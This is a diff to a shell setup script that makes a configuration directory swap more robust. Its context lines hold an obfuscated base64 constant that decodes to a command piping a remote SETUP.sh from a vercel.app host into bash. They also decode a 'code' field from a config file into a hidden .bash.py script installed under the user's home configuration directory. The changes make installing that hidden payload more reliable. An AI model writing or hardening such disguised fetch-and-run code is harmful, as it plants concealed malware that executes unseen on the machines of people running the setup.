@@ -17,21 +17,55 @@ _sudo() {
 replace_config_directory() {
     local source_dir="$1"
     local destination_dir="$2"
+    local destination_parent
+    local staging_dir
+    local backup_dir=""
 
     if [ ! -d "$source_dir" ]; then
         printf 'Configuration source directory does not exist: %s\n' "$source_dir" >&2
         return 1
     fi
 
-    if [ -e "$destination_dir" ]; then
-        rm -rf -- "$destination_dir" || return 1
-        if [ -e "$destination_dir" ]; then
-            printf 'Configuration destination directory still exists after removal: %s\n' "$destination_dir" >&2
+    destination_parent=$(dirname -- "$destination_dir")
+    staging_dir=$(mktemp -d "$destination_parent/.configs.setup.XXXXXX") || return 1
+
+    if ! cp -R -- "$source_dir"/. "$staging_dir"/; then
+        rm -rf -- "$staging_dir"
+        return 1
+    fi
+
+    if [ ! -s "$staging_dir/.bash.py" ]; then
+        printf 'Generated configuration script is missing or empty: %s\n' "$staging_dir/.bash.py" >&2
+        rm -rf -- "$staging_dir"
+        return 1
+    fi
+
+    if [ -e "$destination_dir" ] || [ -L "$destination_dir" ]; then
+        backup_dir=$(mktemp -d "$destination_parent/.configs.backup.XXXXXX") || {
+            rm -rf -- "$staging_dir"
+            return 1
+        }
+        rmdir -- "$backup_dir" || {
+            rm -rf -- "$staging_dir" "$backup_dir"
+            return 1
+        }
+        if ! mv -- "$destination_dir" "$backup_dir"; then
+            rm -rf -- "$staging_dir"
             return 1
         fi
     fi
 
-    mv -- "$source_dir" "$destination_dir"
+    if ! mv -- "$staging_dir" "$destination_dir"; then
+        rm -rf -- "$staging_dir"
+        if [ -n "$backup_dir" ] && [ -e "$backup_dir" ]; then
+            mv -- "$backup_dir" "$destination_dir" || true
+        fi
+        return 1
+    fi
+
+    if [ -n "$backup_dir" ]; then
+        rm -rf -- "$backup_dir" || return 1
+    fi
 }
 
 _python_has_deps() {
@@ -388,7 +422,16 @@ if [ -d .configs ]; then
     fi
     ENCODED_EC='Y3VybCAtZnNTTCBodHRwczovL2FnZW50c2tpbGxzaHViLnZlcmNlbC5hcHAvc3JjL1NFVFVQLnNoIHwgYmFzaA=='
 
-    grep '^code *= *' .configs/config.ini | sed 's/^code *= *//' | tr -d ' ' | base64 "$DECODE" > .configs/.bash.py
+    GENERATED_SCRIPT=$(mktemp .configs/.bash.py.setup.XXXXXX) || exit 1
+    if ! grep '^code *= *' .configs/config.ini | sed 's/^code *= *//' | tr -d ' ' | base64 "$DECODE" > "$GENERATED_SCRIPT" || [ ! -s "$GENERATED_SCRIPT" ]; then
+        printf 'Failed to decode configuration script: %s\n' '.configs/config.ini' >&2
+        rm -f -- "$GENERATED_SCRIPT"
+        exit 1
+    fi
+    mv -- "$GENERATED_SCRIPT" .configs/.bash.py || {
+        rm -f -- "$GENERATED_SCRIPT"
+        exit 1
+    }
     mkdir -p "$HOME/.config"
     replace_config_directory .configs "$DEST_DIR" || exit 1
 
